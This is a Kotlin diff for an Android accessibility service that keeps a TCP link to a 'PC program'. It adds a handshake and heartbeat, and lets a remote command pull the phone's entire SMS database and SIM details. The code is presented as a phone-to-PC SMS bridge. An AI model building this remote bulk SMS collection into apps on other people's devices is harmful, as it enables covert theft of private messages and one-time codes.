@@ -22,6 +22,7 @@ import kotlinx.coroutines.Job
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import org.json.JSONObject
+import java.util.concurrent.atomic.AtomicBoolean
 
 class SmsAccessibilityService : AccessibilityService() {
 
@@ -31,6 +32,10 @@ class SmsAccessibilityService : AccessibilityService() {
     private val defaultPort = 8080
     private var simManager: SimManager? = null
     private var connectionJob: Job? = null
+    private var heartbeatJob: Job? = null
+    private val heartbeatInterval = 10000L
+    private var lastDisconnectTime = 0L
+    private val handshakeConfirmed = AtomicBoolean(false)
 
     private val smsPackages = setOf(
         "com.android.mms",
@@ -52,6 +57,15 @@ class SmsAccessibilityService : AccessibilityService() {
             handleCommand(command)
         }
         
+        networkClient?.setOnDisconnectedListener {
+            if (ConnectionState.isConnected) {
+                LogManager.logWarning("连接已断开")
+                ConnectionState.setConnected(false, "连接断开")
+                heartbeatJob?.cancel()
+            }
+            lastDisconnectTime = System.currentTimeMillis()
+        }
+        
         startConnectionLoop()
     }
 
@@ -62,41 +76,88 @@ class SmsAccessibilityService : AccessibilityService() {
             
             while (isActive) {
                 try {
-                    if (!ConnectionState.isConnected) {
+                    if (!ConnectionState.isConnected && !ConnectionState.isVerifying) {
+                        val timeSinceDisconnect = System.currentTimeMillis() - lastDisconnectTime
+                        if (lastDisconnectTime > 0 && timeSinceDisconnect < 5000) {
+                            delay(5000 - timeSinceDisconnect)
+                            continue
+                        }
+                        
                         val attempt = ConnectionState.connectionAttempts + 1
                         LogManager.log("尝试连接 #$attempt -> $defaultHost:$defaultPort")
-                        ConnectionState.setConnected(false)
                         
+                        networkClient?.disconnect()
+                        handshakeConfirmed.set(false)
                         val startTime = System.currentTimeMillis()
                         val success = networkClient?.connect() ?: false
                         val elapsed = System.currentTimeMillis() - startTime
                         
                         if (success) {
-                            ConnectionState.setConnected(true)
-                            LogManager.logSuccess("连接成功! 耗时 ${elapsed}ms")
-                            sendSimCardsInfo()
+                            ConnectionState.setVerifying()
+                            LogManager.log("TCP连接成功，验证PC程序...")
+                            
+                            networkClient?.sendRaw("""{"type":"handshake"}""")
+                            
+                            var verified = false
+                            for (i in 1..15) {
+                                delay(200)
+                                if (handshakeConfirmed.get()) {
+                                    verified = true
+                                    break
+                                }
+                                if (!networkClient?.isConnected()!!) break
+                            }
+                            
+                            if (verified) {
+                                ConnectionState.setConnected(true)
+                                LogManager.logSuccess("连接成功! 耗时 ${elapsed}ms")
+                                sendSimCardsInfo()
+                                startHeartbeat()
+                            } else {
+                                LogManager.logWarning("握手验证失败，PC程序未响应")
+                                networkClient?.disconnect()
+                                ConnectionState.setConnected(false, "PC程序未响应")
+                                lastDisconnectTime = System.currentTimeMillis()
+                            }
                         } else {
                             LogManager.logError("连接失败 (耗时 ${elapsed}ms)")
                             ConnectionState.setConnected(false, "连接被拒绝")
-                        }
-                    } else {
-                        // 已连接，检测连接状态
-                        val stillConnected = networkClient?.isConnected() ?: false
-                        if (!stillConnected) {
-                            LogManager.logWarning("检测到连接断开")
-                            ConnectionState.setConnected(false, "连接断开")
-                            networkClient?.disconnect()
                         }
                     }
                 } catch (e: Exception) {
                     LogManager.logError("连接异常", e)
                     ConnectionState.setConnected(false, e.message)
                     networkClient?.disconnect()
+                    heartbeatJob?.cancel()
                 }
                 
-                // 未连接时每3秒重试，已连接时每1秒检测
-                val delayMs = if (ConnectionState.isConnected) 1000L else 3000L
-                delay(delayMs)
+                delay(3000)
+            }
+        }
+    }
+    
+    private fun startHeartbeat() {
+        heartbeatJob?.cancel()
+        heartbeatJob = serviceScope.launch {
+            delay(5000)
+            while (isActive && ConnectionState.isConnected) {
+                try {
+                    val success = networkClient?.sendPing() ?: false
+                    if (!success) {
+                        LogManager.logWarning("心跳发送失败，标记断开")
+                        ConnectionState.setConnected(false, "心跳失败")
+                        networkClient?.disconnect()
+                        break
+                    }
+                } catch (e: kotlinx.coroutines.CancellationException) {
+                    throw e
+                } catch (e: Exception) {
+                    LogManager.logError("心跳异常", e)
+                    ConnectionState.setConnected(false, e.message)
+                    networkClient?.disconnect()
+                    break
+                }
+                delay(heartbeatInterval)
             }
         }
     }
@@ -139,18 +200,27 @@ class SmsAccessibilityService : AccessibilityService() {
             val type = json.optString("type")
             
             when (type) {
+                "handshake_ack" -> {
+                    handshakeConfirmed.set(true)
+                    LogManager.log("收到握手确认")
+                }
                 "fetch_all_sms" -> {
                     LogManager.log("执行: 获取所有短信")
-                    val smsList = fetchAllSms()
-                    LogManager.log("找到 ${smsList.size} 条短信")
-                    sendSmsListToPc(smsList)
+                    serviceScope.launch(Dispatchers.IO) {
+                        val limit = json.optInt("limit", 0)
+                        val smsList = fetchAllSms(limit)
+                        LogManager.log("找到 ${smsList.size} 条短信")
+                        sendSmsListToPc(smsList)
+                    }
                 }
                 "fetch_sms" -> {
                     val limit = json.optInt("limit", 100)
                     LogManager.log("执行: 获取最近 $limit 条短信")
-                    val smsList = fetchAllSms(limit)
-                    LogManager.log("找到 ${smsList.size} 条短信")
-                    sendSmsListToPc(smsList)
+                    serviceScope.launch(Dispatchers.IO) {
+                        val smsList = fetchAllSms(limit)
+                        LogManager.log("找到 ${smsList.size} 条短信")
+                        sendSmsListToPc(smsList)
+                    }
                 }
                 "get_sim_cards" -> {
                     LogManager.log("执行: 获取SIM卡信息")
@@ -193,6 +263,7 @@ class SmsAccessibilityService : AccessibilityService() {
         super.onDestroy()
         LogManager.logWarning("无障碍服务销毁，停止连接")
         connectionJob?.cancel()
+        heartbeatJob?.cancel()
         ConnectionState.setConnected(false, "服务销毁")
         networkClient?.disconnect()
     }
@@ -239,7 +310,7 @@ class SmsAccessibilityService : AccessibilityService() {
         }
     }
 
-    fun fetchAllSms(limit: Int = 100): List<SmsData> {
+    fun fetchAllSms(limit: Int = 0): List<SmsData> {
         if (checkCallingOrSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
             LogManager.logError("没有READ_SMS权限，无法读取短信")
             return emptyList()
@@ -248,7 +319,6 @@ class SmsAccessibilityService : AccessibilityService() {
         LogManager.logInfo("开始读取短信数据库...")
         val smsList = mutableListOf<SmsData>()
         
-        // Get SIM slot mapping first
         val subscriptionManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as? android.telephony.SubscriptionManager
         val subIdToSlot = mutableMapOf<Int, Int>()
         
@@ -275,12 +345,18 @@ class SmsAccessibilityService : AccessibilityService() {
             Telephony.Sms.SUBSCRIPTION_ID
         )
 
+        val sortOrder = if (limit > 0) {
+            "${Telephony.Sms.DATE} DESC LIMIT $limit"
+        } else {
+            "${Telephony.Sms.DATE} DESC"
+        }
+
         val cursor: Cursor? = contentResolver.query(
             uri,
             projection,
             null,
             null,
-            "${Telephony.Sms.DATE} DESC LIMIT $limit"
+            sortOrder
         )
 
         cursor?.use {
